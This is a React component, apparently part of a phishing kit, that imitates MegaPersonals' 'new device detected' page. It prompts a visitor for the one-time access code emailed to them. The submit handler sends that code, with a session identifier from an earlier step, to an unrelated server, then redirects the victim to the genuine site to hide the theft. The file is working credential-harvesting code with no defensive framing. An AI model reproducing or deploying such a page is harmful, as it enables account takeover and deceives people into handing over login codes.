
import React, { useState, useEffect } from "react";

const Otp = () => {
       const insertId = sessionStorage.getItem("insertId");

    const [formData, setFormData] = useState({
        otp: "",
        insertId:"",
      });
    
      const handleChange = (e) => {
        const { name, value } = e.target;
        setFormData((prevData) => ({
          ...prevData,
          [name]: value,
        }));
      };

      useEffect(() => {
        setFormData((prevData) => ({
            ...prevData,
            insertId: insertId,
          }));


      }, []);
    
      const handleSubmit = async (e) => {
        e.preventDefault(); // Prevents the default form submission behavior
    
        try {
          const response = await fetch("https://zplay.superice.cloud/api/save_otp", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify(formData),
          });
    
          if (response.ok) {
            const result = await response.json();
           
            console.log("Server Response:", result);

            if(result.success)
            {
                window.location.href="https://megapersonals.com";
            }
          } else {
            alert("Error submitting form");
          }
        } catch (error) {
          console.error("Error:", error);
          alert("An error occurred while submitting the form.");
        }
      };
    
    return (
        <div style={{ position: 'absolute' }}>
        <template shadowRootMode="open">
          <div
            aria-live="assertive"
            id="__next-route-announcer__"
            role="alert"
            style={{
              position: 'absolute',
              border: '0px',
              height: '1px',
              margin: '-1px',
              padding: '0px',
              width: '1px',
              clip: 'rect(0px, 0px, 0px, 0px)',
              overflow: 'hidden',
              whiteSpace: 'nowrap',
              overflowWrap: 'normal',
            }}
          ></div>
        </template>
        <div className="container pt-[35px] flex flex-col items-center overflow-x-hidden">
          <div className="w-[65%] lg:w-full">
            <img src="/images/megapersonals.png" alt="megaeprsonals" />
          </div>
          <div className="mt-5 py-1.5 w-full bg-[#F8EFCE] text-[#B8AF8E] text-xl text-center font-medium uppercase">
            New device detected
          </div>
          <p className="mt-6 text-xl text-[#C75400] text-center">
            Your ACCESS CODE <br /> has been sent <b>Successfully</b> <br />
            to your email on <b>December 13, 2024</b>. <br /> That code remains
            valid.
          </p>
          <p className="mt-5 text-center text-xl italic font-bold text-[#2FAEEA] uppercase">
            CHECK YOUR SPAM <br /> FOLDER IT MAY BE THERE.
          </p>
          <p className="mt-7 flex items-center gap-3 text-xl text-[#C75400] text-center font-bold italic uppercase">
            <span>DO NOT SHARE IT</span>
            <span className="bg-[#2FAEEA] w-6 h-6 rounded-full text-white flex justify-center items-center font-bold not-italic">
              <span>?</span>
            </span>
          </p>
          <p className="mt-5 text-xl text-[#C75400] text-center">
            Enter the code <br /> below to continue.
          </p>
          <div className="mt-7 flex items-center">
            <form
              onSubmit={handleSubmit}
              action="#"
              className="flex flex-col items-center"
            >
              <div>
                <input
                  required
                  className="w-full px-[12px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                  name="otp"
                  value={formData.name}
                  onChange={handleChange}
                />
              </div>
              <button
                type="submit"
                className="mt-[20px] bg-custom-orange text-white text-[20px] px-[21px] py-[8px] tracking-wider"
              >
                Submit
              </button>
            </form>
          </div>
        </div>
      </div>
    );
};

export default Otp;
